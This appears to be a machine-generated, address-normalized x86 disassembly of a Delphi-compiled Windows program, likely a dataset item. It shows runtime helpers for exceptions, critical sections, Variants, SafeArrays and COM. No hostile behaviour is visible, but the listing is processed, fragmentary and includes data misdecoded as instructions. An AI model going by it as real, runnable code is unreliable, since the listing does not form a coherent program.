sub_40ba0c
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
retn
sub_40baa4
push ebx
mov ebx eax
mov eax ebx
call sub_40ba24
and eax 0xff
mov eax [ eax * 8 + rw-data ]
pop ebx
retn
sub_40bc77
jmp sub_4038d0
sub_40bc7e
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd43
jmp sub_4038d0
sub_40bd4a
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40bd54
call sub_40b5e0
mov eax 0x1
call sub_403eb4
sub_40bed8
cmp eax [ rw-data ]
jl r-xdata
mov al 0x1
retn
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
retn
cmp edx [ rw-data ]
jle r-xdata
sub_40bfb1
jmp sub_4038d0
sub_40bfce
jmp sub_4038d0
sub_40bfd5
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40c080
xor ecx ecx
cmp [ rw-data ] 0x0
je r-xdata
mov eax ecx
retn
call sub_40bfe4
mov ecx eax
sub_40c26c
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
mov eax 0x1
pop ebx
retn
push ebx
call CharNextA
sub eax ebx
pop ebx
retn
sub_40c28c
push eax
call CharNextA
retn
sub_40c524
jmp sub_4038d0
sub_40c52b
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_40c594
mov eax [ rw-data ]
cmp eax 0x1f
ja r-xdata
setb al
retn
bt [ rw-data ] eax
sub_40c9eb
jmp sub_4038d0
sub_40c9f2
pop ebx
mov esp ebp
pop ebp
retn
sub_40cbbb
jmp sub_4038d0
sub_40cbc2
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
Sleep
jmp [ Sleep@IAT ]
sub_40cc64
jmp sub_4038d0
sub_40cc6b
pop ebx
mov esp ebp
pop ebp
retn
sub_40cc70
push ebx
mov ebx eax
test ebx ebx
jne r-xdata
mov eax ebx
pop ebx
retn
call sub_40cbd4
sub_40cc80
push ebx
mov al 0x1
mov ebx [ rw-data ]
jmp r-xdata
test al al
je r-xdata
pop ebx
retn
test ebx ebx
jne r-xdata
call [ ebx + 0x4 ]
mov ebx [ ebx ]
sub_40cc9c
push ebx
mov ebx rw-data
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov eax [ ebx ]
mov edx [ eax ]
mov [ ebx ] edx
mov edx 0x8
call sub_4026fc
pop ebx
retn
sub_40cd24
mov edx 0xffffffff
xchg edx eax
[ edx ] eax
dec eax
retn
sub_40cd30
xchg [ eax ] edx
mov eax edx
retn
sub_40cd90
push ebp
mov ebp esp
push ecx
call GetCurrentThreadId
mov [ ebp - 0x2 ] ax
mov al [ ebp - 0x2 ]
xor al [ ebp - 0x1 ]
and al 0xf
pop ecx
pop ebp
retn
sub_40ce20
mov eax [ edx ]
xor ecx ecx
mov [ eax + 0x4 ] ecx
mov eax [ edx ]
xor edx edx
mov [ eax + 0x8 ] edx
retn
sub_40cf38
mov eax [ eax + 0x10 ]
push eax
call SetEvent
retn
sub_40cf60
mov edx [ eax + 0x18 ]
push edx
mov eax [ eax + 0x14 ]
push eax
call WaitForSingleObject
retn
sub_40d1db
jmp sub_4038d0
sub_40d1e2
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_40d250
jmp sub_4038d0
sub_40d257
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40d275
mov eax [ ebp - 0xc ]
push eax
call SetErrorMode
retn
sub_40d26e
jmp sub_4038d0
sub_40d275
mov eax [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40d738
jmp sub_4038d0
sub_40d73f
pop ebp
retn
VariantChangeType
jmp [ VariantChangeType@IAT ]
sub_40d7b8
push ebp
mov ebp esp
mov eax 0x80004001
pop ebp
retn 0x10
sub_40d81e
jmp sub_4038d0
sub_40d825
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d88a
jmp sub_4038d0
sub_40d891
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d8f6
jmp sub_4038d0
sub_40d8fd
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d962
jmp sub_4038d0
sub_40d969
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40d9ce
jmp sub_4038d0
sub_40d9d5
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
sub_40da4d
jmp sub_4038d0
sub_40da54
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x10
sub_40dac0
jmp sub_4038d0
sub_40dac7
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40db30
jmp sub_4038d0
sub_40db37
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x14
sub_40dba4
jmp sub_4038d0
sub_40dbab
mov eax ebx
pop ebx
pop ecx
pop ebp
retn 0x10
SafeArrayCreate
jmp [ __import_lookup_table_11(oleaut32:SafeArrayCreate) ]
SafeArrayGetLBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetLBound) ]
SafeArrayGetUBound
jmp [ __import_lookup_table_11(oleaut32:SafeArrayGetUBound) ]
sub_40df31
jmp sub_4038d0
sub_40df38
pop ebp
retn
sub_40df3c
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_40dc00
sub_40df4d
add [ esp + 0x4 ] 0xfffffff8
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax ]
sub_40e5d6
jmp sub_4038d0
sub_40e5dd
pop ecx
pop ebp
retn
sub_40e66f
jmp sub_4038d0
sub_40e676
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e6c6
jmp sub_4038d0
sub_40e6cd
pop ecx
pop ebp
retn
sub_40e71a
jmp sub_4038d0
sub_40e721
pop ecx
pop ebp
retn
sub_40e7b3
jmp sub_4038d0
sub_40e7ba
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40e80a
jmp sub_4038d0
sub_40e811
pop ecx
pop ebp
retn
sub_40ea59
jmp sub_4038d0
sub_40ea60
pop ebx
mov esp ebp
pop ebp
retn
sub_40eb76
jmp sub_4038d0
sub_40eb7d
pop ecx
pop ebp
retn
sub_40eb80
push ebx
mov ebx eax
mov eax ebx
call sub_40ee18
mov [ ebx ] 0x1
pop ebx
retn
sub_40ee2c
push eax
call sub_40ee18
pop eax
retn
sub_40f08c
call sub_40f140
retn
sub_40f1e0
jmp sub_4038d0
sub_40f1e7
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40f22e
jmp sub_4038d0
sub_40f235
pop ebx
pop ecx
pop ebp
retn
sub_40f27a
jmp sub_4038d0
sub_40f281
pop ebx
pop ecx
pop ebp
retn
sub_40f2c6
jmp sub_4038d0
sub_40f2cd
pop ebx
pop ecx
pop ebp
retn
sub_40f312
jmp sub_4038d0
sub_40f319
pop ebx
pop ecx
pop ebp
retn
sub_40f6db
jmp sub_4038d0
sub_40f6e2
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40f77c
jmp sub_4038d0
sub_40f783
mov eax [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_40fbf1
jmp sub_40361c
sub_40fcac
jmp sub_40361c
sub_40fd53
jmp sub_40361c
sub_40fe4c
jmp sub_40361c
sub_40ff25
jmp sub_40361c
sub_41000d
jmp sub_40361c
sub_4101ca
jmp sub_4038d0
sub_4101d1
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410233
jmp sub_4038d0
sub_41023a
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4106a0
jmp sub_40361c
sub_41078f
jmp sub_4038d0
sub_410796
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410834
jmp sub_4038d0
sub_41083b
mov al [ ebp - 0x1 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410bd8
call sub_410890
neg al
sbb eax eax
neg eax
retn
sub_410c99
jmp sub_4038d0
sub_410ca0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_410d49
jmp sub_4038d0
sub_410d50
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4112a1
jmp sub_40361c
sub_4113a8
jmp sub_4038d0
sub_4113af
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_4114b9
jmp sub_4038d0
sub_4114c0
fld [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411910
jmp sub_4038d0
sub_411917
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411a21
jmp sub_4038d0
sub_411a28
fild [ ebp - 0x8 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_411f6e
jmp sub_4038d0
sub_411f75
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412019
jmp sub_4038d0
sub_412020
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412042
lea eax [ ebp - 0x18 ]
mov edx 0x2
call sub_404648
retn
sub_41203b
jmp sub_4038d0
sub_412042
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41209e
jmp sub_4038d0
sub_4120a5
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412121
jmp sub_4038d0
sub_412667
jmp sub_4038d0
sub_41266e
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412701
jmp sub_4038d0
sub_412708
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_412725
lea eax [ ebp - 0x14 ]
call sub_404630
retn
sub_41271e
jmp sub_4038d0
sub_412725
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412782
jmp sub_4038d0
sub_412789
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41282b
jmp sub_4038d0
sub_412848
jmp sub_4038d0
sub_41284f
mov al [ ebp - 0x5 ]
pop ebx
mov esp ebp
pop ebp
retn
sub_412daa
jmp sub_4038d0
sub_412db1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_412e22
jmp sub_4038d0
sub_412e29
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4131b4
push eax
call sub_40ee18
pop eax
mov [ eax ] 0x7
fstp [ eax + 0x8 ]
fwait
retn
sub_4131c8
push eax
call sub_40ee18
pop eax
mov [ eax ] 0x6
fistp [ eax + 0x8 ]
fwait
retn
sub_413353
jmp sub_4038d0
sub_41337f
jmp sub_4038d0
sub_413386
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4135b3
jmp sub_4038d0
sub_4135ba
mov eax ebx
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41385b
jmp sub_4038d0
sub_4138e9
jmp sub_4038d0
sub_4139d9
jmp sub_4038d0
sub_413a7b
jmp sub_4038d0
sub_413b31
jmp sub_4038d0
sub_413bd8
cmp [ eax ] 0x8
jb r-xdata
retn
push [ eax + 0xc ]
push [ eax + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
mov [ eax ] 0x0
mov edx esp
call sub_40f140
add esp 0x10
sub_413e82
jmp sub_4038d0
sub_413e89
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_413ecc
mov ax [ eax ]
retn
sub_413fcc
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_40ee18
mov [ ebx ] 0xa
mov [ ebx + 0x8 ] esi
pop esi
pop ebx
retn
sub_413fe4
mov edx 0x80020004
call sub_413fcc
retn
sub_414034
mov dl 0x1
call sub_41403c
retn
sub_4140e9
jmp sub_4038d0
sub_4140f0
pop esi
pop ebx
pop ebp
retn
sub_4140f4
push ebp
mov ebp esp
call sub_4142b4
pop ebp
retn 0x4
sub_414180
push ebp
mov ebp esp
call sub_4142b4
pop ebp
retn 0x4
sub_414263
jmp sub_4038d0
sub_41426a
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_403144
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034f0
sub_41428c
xor eax eax
retn
sub_414290
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4142a4
mov [ ecx ] 0x8
mov al 0x1
retn
sub_4142ac
call sub_40e58c
retn
sub_4142b4
call sub_40e67c
retn
sub_4142bc
call sub_40eb2c
retn
sub_4142c4
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
mov ax [ eax + 0x4 ]
mov [ edx ] ax
mov al 0x1
pop ebp
retn 0x4
sub_4142d8
call sub_4142b4
retn
sub_4142e0
push ebp
mov ebp esp
call sub_4142bc
pop ebp
retn 0x8
sub_4142f8
push ebp
mov ebp esp
or eax 0xffffffff
pop ebp
retn 0x4
sub_4143d4
jmp sub_4038d0
sub_41449d
jmp sub_4038d0
sub_4144a4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4144c1
lea eax [ ebp - 0x10 ]
call sub_403f50
retn
sub_4144ba
jmp sub_4038d0
sub_4144c1
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4144cc
call sub_40eb80
retn
sub_4144d4
mov ecx 0xe
call sub_413b70
cmp al 0x1
retn
sub_414553
jmp sub_4038d0
sub_41455a
pop ebp
retn
sub_4145fd
jmp sub_4038d0
sub_414604
pop ebp
retn
sub_41472d
jmp sub_4038d0
sub_414734
pop ebp
retn
sub_414738
sub [ rw-data ] 0x1
retn
sub_414836
jmp sub_4038d0
sub_41483d
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414b5c
push ebx
add esp 0xffffff00
mov ebx ecx
push 0xff
lea ecx [ esp + 0x4 ]
call sub_414ac4
mov eax ebx
mov edx esp
call sub_4041b4
add esp 0x100
pop ebx
retn
sub_414bb8
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_403fa4
pop esi
pop ebx
retn
sub_414c94
jmp sub_4038d0
sub_414c9b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414cec
jmp sub_4038d0
sub_414cf3
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_414e40
jmp sub_4038d0
sub_414e47
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_414f16
jmp sub_4038d0
sub_414f1d
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_415234
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
mov edx esi
call sub_40f140
pop esi
pop ebx
retn
sub_4154de
jmp sub_4038d0
sub_4154e5
pop ebp
retn
sub_4154e8
sub [ rw-data ] 0x1
retn
CoInitialize
jmp [ __import_lookup_table_12(ole32:CoInitialize) ]
CoUninitialize
jmp [ __import_lookup_table_12(ole32:CoUninitialize) ]
CoCreateInstance
jmp [ __import_lookup_table_12(ole32:CoCreateInstance) ]
CoTaskMemAlloc
jmp [ __import_lookup_table_12(ole32:CoTaskMemAlloc) ]
sub_415535
jmp sub_4038d0
sub_41553c
pop ebp
retn
sub_415540
sub [ rw-data ] 0x1
retn
sub_415e43
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418da0
sub_415e4d
add [ esp + 0x4 ] 0xfffffff8
jmp sub_418dc0
sub_416b93
add [ esp + 0x4 ] 0xffffffd8
jmp sub_42179c
sub_416b9d
add [ esp + 0x4 ] 0xffffffd8
jmp sub_4217bc
sub_416ba7
add [ esp + 0x4 ] 0xffffffd4
mov eax [ esp + 0x4 ]
mov eax [ eax ]
jmp [ eax + 0x28 ]
sub_416ccf
push ecx
push eax
call eax
adc eax [ edx ]
fcom [ ebx ]
inc edx
add ah bl
adc eax [ edx ]
hlt
sub_416f14
push ecx
mov [ esp ] ax
mov [ esp + 0x2 ] dx
mov eax [ esp ]
pop edx
retn
sub_416f88
push ecx
mov [ esp ] eax
cmp [ esp ] 0xffff
jne r-xdata
xor eax eax
pop edx
retn
cmp [ esp + 0x2 ] 0xffff
je r-xdata
mov al 0x1
pop edx
retn
sub_417054
mov eax [ eax + 0xc ]
call sub_418454
retn
sub_41732b
jmp sub_4038d0
sub_417332
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_417338
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x4 ]
call sub_41860c
test eax eax
setge al
pop esi
pop ebx
retn
sub_41763b
jmp sub_4038d0
sub_417642
mov esp ebp
pop ebp
retn
sub_417710
add eax 0x8
push eax
call EnterCriticalSection
retn
sub_41771c
push ebx
mov ebx edx
mov edx ebx
call sub_417530
test eax eax
je r-xdata
pop ebx
retn
mov edx ebx
call sub_417290
sub_4177c8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_417923
jmp sub_4038d0
sub_4179f7
jmp sub_4038d0
sub_417a08
mov eax [ eax - 0x38 ]
or eax eax
je r-xdata
retn
mov eax [ eax + 0x2 ]
sub_417a74
jmp sub_4038d0
sub_417a7b
pop ebx
mov esp ebp
pop ebp
retn
sub_417ac6
jmp sub_4038d0
sub_417acd
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417b59
jmp sub_4038d0
sub_417b60
pop ebx
pop ebp
retn
sub_417bda
jmp sub_4038d0
sub_417be1
pop ebx
pop ebp
retn
sub_417c26
jmp sub_4038d0
sub_417c2d
pop ebx
pop ebp
retn
sub_417c77
jmp sub_4038d0
sub_417c7e
pop esi
pop ebx
pop ebp
retn
sub_417cd2
jmp sub_4038d0
sub_417cd9
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ebp
retn
sub_417e06
jmp sub_4038d0
sub_417e82
jmp sub_4038d0
sub_417f58
cmp [ rw-data ] 0x0
je r-xdata
retn
mov edx eax
mov eax [ rw-data ]
call sub_41874c
sub_418048
jmp sub_4038d0
sub_4181d2
jmp sub_4038d0
sub_4181d9
mov eax ebx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418273
jmp sub_4038d0
sub_41827a
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418299
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418292
jmp sub_4038d0
sub_418299
mov al [ ebp - 0x9 ]
mov esp ebp
pop ebp
retn
sub_418305
jmp sub_4038d0
sub_41830c
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418404
jmp sub_4038d0
sub_41840b
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_403154
retn
sub_418421
jmp sub_4038d0
sub_418488
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_4187a8
xor edx edx
mov eax ebx
call sub_41876c
pop ebx
retn
sub_418500
mov eax [ ebp + 0x4 ]
retn
sub_418536
pop ecx
pop edx
pop esi
pop ebx
retn
sub_418584
jmp sub_4038d0
sub_41858b
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_418590
push ebx
mov ebx eax
mov eax [ ebx + 0x8 ]
cmp eax [ ebx + 0xc ]
jne r-xdata
mov eax ebx
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
sub_4185a8
xor edx edx
call sub_4185b0
retn
sub_418698
mov edx [ eax + 0x8 ]
dec edx
call sub_4185b0
retn
sub_418818
retn
sub_4188d2
jmp sub_4038d0
sub_4188d9
cmp [ ebp - 0x5 ] 0x0
jle r-xdata
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_4034f0
sub_418968
jmp sub_4038d0
sub_41896f
pop ebx
pop ecx
pop ebp
retn
sub_418974
push ebx
mov ebx eax
lea eax [ ebx + 0x8 ]
push eax
call EnterCriticalSection
mov eax [ ebx + 0x4 ]
pop ebx
retn
sub_4189cb
jmp sub_4038d0
sub_4189d2
pop ebx
pop ecx
pop ebp
retn
sub_4189d8
add eax 0x8
push eax
call LeaveCriticalSection
retn
sub_418a14
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
retn
sub_418a2c
mov ecx eax
cmp edx eax
jge r-xdata
mov eax ecx
retn
mov ecx edx
sub_418b07
retn
sub_418bac
test edx edx
je r-xdata
xor edx edx
call sub_418bc0
retn
xchg edx eax
mov ecx [ eax ]
call [ ecx ]
retn
sub_418c76
jmp sub_4038d0
sub_418c7d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418c90
xchg edx eax
call sub_418bc0
retn
sub_418c98
retn
sub_418d31
jmp sub_4038d0
sub_418d38
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_418d8e
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
sub_418ef5
jmp sub_4038d0
sub_418efc
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419065
jmp sub_4038d0
sub_41906c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4190b0
xor edx edx
call sub_418f6c
retn
sub_41921e
jmp sub_4038d0
sub_419238
inc [ eax + 0xc ]
retn
sub_41923c
cmp [ eax + 0xc ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x1c ]
sub_4192a6
jmp sub_4038d0
sub_4192b4
dec [ eax + 0xc ]
call sub_41923c
retn
sub_4192c0
xor eax eax
retn
sub_4192c4
push ebx
mov ebx ecx
mov eax ebx
call sub_403f50
pop ebx
retn
sub_4193ba
jmp sub_4038d0
sub_4193c1
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4194d1
jmp sub_4038d0
sub_4195c8
retn
sub_4195cc
retn
sub_41960c
retn
sub_419610
retn
sub_41967c
mov eax [ eax + 0x18 ]
retn
sub_419782
jmp sub_4038d0
sub_419789
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4197a6
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_41979f
jmp sub_4038d0
sub_4197a6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419830
jmp sub_4038d0
sub_419848
push ebx
mov ebx eax
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
inc [ ebx + 0x8 ]
pop ebx
retn
mov dl 0x1
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_419904
dec [ eax + 0x8 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
retn
xor edx edx
mov ecx [ eax ]
call [ ecx + 0x30 ]
sub_4199ad
jmp sub_4038d0
sub_4199b4
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_4199c0
mov eax [ ebp + 0x4 ]
retn
sub_4199f6
pop ecx
pop edx
pop esi
pop ebx
retn
sub_419a44
jmp sub_4038d0
sub_419a4b
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_419b0a
jmp sub_4038d0
sub_419b11
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419b33
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403f74
retn
sub_419b2c
jmp sub_4038d0
sub_419b33
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419b3c
mov edx [ eax ]
call [ edx + 0x14 ]
retn
sub_419b44
xor eax eax
retn
sub_419b8d
jmp sub_4038d0
sub_419b94
mov eax ebx
pop ebx
pop ecx
pop ebp
retn
sub_419ca7
jmp sub_4038d0
sub_419cae
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419d43
jmp sub_4038d0
sub_419d4a
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419dc8
jmp sub_4038d0
sub_419dcf
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419e9f
jmp sub_4038d0
sub_419ea6
mov eax [ ebp - 0x8 ]
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_419f5c
jmp sub_4038d0
sub_419f63
pop esi
pop ecx
pop ebp
retn
sub_419fe8
jmp sub_4038d0
sub_419fef
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a00c
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_41a005
jmp sub_4038d0
sub_41a00c
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a098
jmp sub_4038d0
sub_41a0b5
jmp sub_4038d0
sub_41a0bc
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a0f8
retn
sub_41a17b
jmp sub_4038d0
sub_41a182
mov eax [ ebp - 0x8 ]
call sub_41cd20
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a1a7
lea eax [ ebp - 0xc ]
call sub_403f50
retn
sub_41a1a0
jmp sub_4038d0
sub_41a1a7
mov esp ebp
pop ebp
retn
sub_41a1f7
jmp sub_4038d0
sub_41a1fe
pop esi
pop ecx
pop ebp
retn
sub_41a251
jmp sub_4038d0
sub_41a258
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a260
retn
sub_41a2db
jmp sub_4038d0
sub_41a2e2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41a37f
jmp sub_4038d0
sub_41a386
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41a3a3
lea eax [ ebp - 0x8 ]
call sub_403f50
retn
sub_41a39c
jmp sub_4038d0
sub_41a3a3
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41a3a8
retn
sub_41a422
jmp sub_4038d0
sub_41a429
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_41a430
mov eax edx
mov edx ecx
call sub_407edc
retn
sub_41a43c
push ebx
mov ebx eax
test [ ebx + 0x4 ] 0x4
jne r-xdata
mov al [ ebx + 0x7 ]
pop ebx
retn
mov dl 0x3d
mov eax ebx
call sub_41a454
sub_41a4cc
push ebx
xor ecx ecx
mov ebx [ eax ]
call [ ebx + 0x3c ]
pop ebx
retn
sub_41a53c
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x22 ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x24 ]
call [ ebx + 0x20 ]
sub_41a558
push ebx
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
cmp [ eax + 0x2a ] 0x0
je r-xdata
mov ebx eax
mov edx eax
mov eax [ ebx + 0x2c ]
call [ ebx + 0x28 ]
sub_41a74c
mov eax [ eax + 0x18 ]
retn
sub_41a750
mov eax [ eax + 0x14 ]
retn
sub_41a7ec
push ebx
push esi
mov esi eax
push 0x0
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x64 ]
pop esi
pop ebx
retn
sub_41a9f8
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
shl edx 0x3
lea eax [ ebx + 0x10 ]
call sub_40271c
mov [ ebx + 0x18 ] esi
pop esi
pop ebx
retn
sub_41aa34
test dl dl
je r-xdata
mov edx [ eax ]
call [ edx + 0x80 ]
retn
mov edx [ eax ]
call [ edx + 0x84 ]
retn
sub_41aa4c
push ebx
mov ebx [ eax + 0x10 ]
mov ecx [ ebx + ecx * 8 ]
mov ebx [ eax + 0x10 ]
mov edx [ ebx + edx * 8 ]
mov ebx [ eax ]
call [ ebx + 0x34 ]
pop ebx
retn
sub_41aa60
mov edx sub_41aa4c
mov ecx [ eax ]
call [ ecx + 0x94 ]
retn
sub_41aaa8
cmp [ eax + 0x1e ] 0x0
je r-xdata
mov eax edx
mov edx ecx
call sub_407edc
retn
mov eax edx
mov edx ecx
call sub_407ea4
retn
sub_41ab44
retn
sub_41ae3c
jmp sub_4038d0
sub_41ae43
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0xc ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_41aea4
jmp sub_4038d0
sub_41aeab
mov eax [ ebp - 0x4 ]
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_41aeb4
xor ecx ecx
call sub_41aebc
retn
sub_41af0c
jmp sub_4038d0
sub_41af13
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_41af54
mov eax [ eax + 0x4 ]
call sub_408488
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41af64
mov eax [ eax + 0x4 ]
call sub_4084b4
cmp eax 0xffffffff
jne r-xdata
retn
xor eax eax
sub_41afa0
push ebx
mov ebx edx
mov ecx eax
mov eax ebx
cdq
push edx
push eax
mov eax ecx
mov edx [ eax ]
call [ edx + 0x8 ]
pop ebx
retn
sub_41b149
jmp sub_4038d0
sub_41b1a8
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
retn
sub_41b238
push ebx
mov ebx eax
xor edx edx
mov eax ebx
call sub_41b288
xor eax eax
mov [ ebx + 0x8 ] eax
xor eax eax
mov [ ebx + 0xc ] eax
pop ebx
retn
sub_41b473
jmp sub_4038d0
sub_41b47a
mov esp ebp
pop ebp
retn
sub_41b524
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b764
call sub_403908
